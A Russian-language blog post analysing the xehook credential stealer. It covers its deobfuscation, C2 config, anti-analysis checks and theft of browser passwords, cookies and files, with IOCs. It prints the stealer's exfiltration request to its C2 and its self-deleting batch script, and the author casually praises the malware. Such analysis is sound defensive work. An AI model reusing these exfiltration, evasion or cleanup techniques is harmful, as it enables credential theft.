---
title:  "Malware Analysis - xehook Stealer analysis"
date:   2024-02-29 00:01:00 +0300
author: cozy
categories: [malware, stealer]
---

### Introduction
Great Stealer, реально крутой стилак.
SHA256: `a3882ac90190c7ccbea744dde58f0a107b67e3eea0024b12d18e72faf9a55b1c`

### Stage 1
натравим de4dot
![](/images/xehook/1.png)\
вооот сразу видно наш народный virtualProtect и createThread. Запускаем, дампим и там будут байтики 0x4d 0x5a то есть **MZ** сигнатура.
![](/images/xehook/2.png)

### xeHook stealer
obfuscated with confuserEx
![](/images/xehook/3.png)

use de4dot\
![](/images/xehook/4.png)\
готовый бинарь кайф
![](/images/xehook/5.png)

Первый метод получает рандомную строку размером в 32 байта из символов "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789". Example: "OYGSQGUGRRQKK07OWWLYT6TE25JAIGKN". Данные байты в конечном итоге будут являться названием файла.
![](/images/xehook/6.png)\
следующий метод декодит C2: `https://trecube[.]com/`, `https://nc1337[.]online/`, а также обращается к C2. Если C2 возвращает `index.html` то ВПО работает с этим C2. В частности первый C2 вернул `index.html` поэтому все дальнейшие обращения будут к этому серверу.

Следующий метод конкатенирует строки с C2 для дальнейшего обращения и получения конфигурации: `https://trecube[.]com/getjson.php?id=40`. 
Получаемая конфигурация:
```Text
"{\r\n\t\"debug\": \"0\",\r\n\t\"emulate\": \"0\",\r\n\t\"virtualbox\": \"0\",\r\n\t\"virustotal\": \"0\",\r\n\t\"error\": \"0\",\r\n\t\"errorname\": \"NONE\",\r\n\t\"errtextbox\": \"NONE\",\r\n\t\"competitor\": \"0\",\r\n\t\"selfmelf\": \"1\",\r\n\t\"domaindetect\": \"facebook.com;linkedin.com;twitter.com\",\r\n\t\"filext\": \"*.txt;*.doc;*.docx;*.json;*.odt;*.dat;*.pdf;*.rtf;*.eml;*.wallet;*seed*\"\r\n}"
```
проверка на всякие залупы такие как, будет ли проверяться на vm, будет ли проверяться на debug. Также *domaindetect* это домены с которых желательно собирались бы креды??, а *filext* это расширения файлов которые будут спизжены в дальнейшем.

#### Debug features

Также присутсвтуют проверки на debug
![](/images/xehook/7.png)\
![](/images/xehook/8.png)\
В данном случае проверяются следующие запущенные процессы (Маловато?):
1. "processhacker"
2. "netstat"
3. "netmon"
4. "tcpview"
5. "wireshark"
6. "filemon"
7. "regmon"
8. "cain"


Check Ticks\
![](/images/xehook/9.png)\
Также с помощью WMI чекатеся фичи процессора путем выполнения команды: `Select * from Win32_ComputerSystem`
![](/images/xehook/10.png)
Идет обращение к `http://ip-api[.]com/line/?fields=hosting`
![](/images/xehook/11.png)\
Также идет проверка на языки клавиатуры, в частности если один из следующих языков присутсвтует, то ВПО завершает свое выполнение:
1. "ru-RU" (Наши братушки получается??)
2. "kk-KZ"
3. "ro-MD"
4. "uz-UZ"
5. "be-BY"
6. "az-Latn-AZ"
7. "hy-AM"
8. "ky-KG"
9. "tg-Cyrl-TJ"

![](/images/xehook/12.png)


#### Stealer features
Обращается к `http://ip-api[.]com/json/?fields=11827` которая в формате json отдает инфу о тачке
```json
{
    "country": "<country>",
    "countryCode": "<replaced>",
    "city": "<replaced>",
    "zip": "<replaced>",
    "isp": "<holding here_replaced>",
    "org": "<provider_replaced>",
    "as": "<some_data_too_about_provider_replaced>",
    "query": "<ip_here_replaced>"
}
```
кароч я все зареплейсил, но там буквально вся инфа.
весь пиздинг идет в этом методе.
![](/images/xehook/13.png)

пиздинг идет по всем расширениям из C2, а именно:
`*.txt;*.doc;*.docx;*.json;*.odt;*.dat;*.pdf;*.rtf;*.eml;*.wallet;*seed`
все найденные файлы данное ВПО упаковывает в .zip архив, формирует файл из тех 32 байтов которые получались в первом методе путем перестановки строки"ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789".\
Данный файл сохраняется по пути `%LOCALAPPDATA%`. 
В частности: `%LOCALAPPDATA%\53Q98KXOBEQ1UDM2WFKRS8MOQDWDG1EL`

Также пиздятся autofill data, cookie и все что можно с браузеров спиздить.
Также делается screenshot экрана.
В данном методе формируется запрос, которые отправляется на C2. В частности формирутеся такой запрос: 

```text
https://trecube[.]com/gate[.]php?id=40&build=new_cloudnever&passwords=<pass_count>&cookies=<cookies_count>&username=<username>&country=<country>&ip=<ip_here>&BSSID=<md5hash_of_procID_and_Diskdrive_serialNumber>&wallets=<amount_of_wallets>&token=xehook40363717&ext=0&filters=0&pcname=<pc_name>&cardsc=0&telegram=False&discord=False&steam=False&domaindetect=
```


Данный запрос отправляется на C2 вместе с файлом который является большой зипкой,и затем происходит удаление данного файла.
![](/images/xehook/14.png)

В конце выполнения ВПО формирует *.bat* скрипт, а именно скрипт с названием *delete.bat* и сохраняет его в %TEMP%
![](/images/xehook/15.png)

Содержимое данного скрипта:
```cmd
@echo off
ping 127.0.0.1 -n 2 > nul
@ "del ""%DESKTOP%\a3882ac90190c7ccbea744dde58f0a107b67e3eea0024b12d18e72faf9a55b1c\dump2-cleaned.bin"""
@"del ""%TEMP%\delete.bat"""
```

В данном скрипте происходит пинг локалхоста, удаление оригинального исполняемого файла, а также удаленние .bat скрипта.

### Stolen data
Вся спизженная дата хранится в *%LOCALAPPDATA%* с рандомным именем состоящим из перестановки 32-х байтов  "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789".

Данный файл состоит из зипок .zip, но его можно воспринимать как одну целую зипку, так что его можно просто распаковать.
Вот что хранится внутри данного .zip файла:
![](/images/xehook/16.png)\
Где:
1. Autofills это директория в которой находятся файлик со спизженой autofill датой из браузеров, в частности:\
![](/images/xehook/17.png)\
![](/images/xehook/18.png)\
2. Cookies - спизженные куки файлики.
![](/images/xehook/19.png)\
![](/images/xehook/20.png)
3. Files - все файлы с расширениями указанными в конфигурационном файле с C2, а именно `*.txt;*.doc;*.docx;*.json;*.odt;*.dat;*.pdf;*.rtf;*.eml;*.wallet;*seed*`
![](/images/xehook/21.png)\
![](/images/xehook/22.png)\
Внутри данных директорий находятся файлы с расширенями, в частности пример:
![](/images/xehook/23.png)\
4. About PC.txt - там находится вся инфа о пк, а также ахуенная stealerNote (записька стилера ;)) )
![](/images/xehook/24.png)\
Также она плейнтекстом
```text    


__  _____| |__   ___   ___ | | __
\ \/ / _ \ '_ \ / _ \ / _ \| |/ /
 >  <  __/ | | | (_) | (_) |   < 
/_/\_\___|_| |_|\___/ \___/|_|\_\

xehook Stealer — https://t[.]me/xehook

Build location: a3882ac90190c7ccbea744dde58f0a107b67e3eea0024b12d18e72faf9a55b1c\dump2-cleaned.bin
Build tag: <replaced>
Build version: 2.0.8 Stable

Launch time: <replaced>
IP address: <replaced> 
Postcode: <replaced>
Location: <replaced>

Computer: <replaced>
Username: <replaced>
OS: Windows 10 Pro (x64)
Language: <replaced>

Resolution: <replaced>
GPU: <replaced>
CPU: <replaced>
RAM: <replaced>
MAC: <replaced>

Device HWID: <md5_hash_replaced>

```


ну к слову записка реально ахуенная
5. Passwords.txt - файл с пароля с браузеров, а именно hostname - это url, Username - логин, Password - пароль, Browser - ну клиент типа.\
![](/images/xehook/25.png)\
6. Screenshot.jpg - скриншот во время выполнения ВПО. В частности делается внутри данного метода
![](/images/xehook/13.png)


### IOCS

| C2                       |
|--------------------------|
| https://trecube[.]com/   |
| https://nc1337[.]online/ |

| SHA256                                                           | File   |
| ---------------------------------------------------------------- | ------ |
| a3882ac90190c7ccbea744dde58f0a107b67e3eea0024b12d18e72faf9a55b1c | Stage1 |
| daea71a3094e0c90554a77e95b0b354d1515f99e70fa5013f09302a5bb04dde0 | xehook |


### Conclusion
крутой стилак че сказать норм.
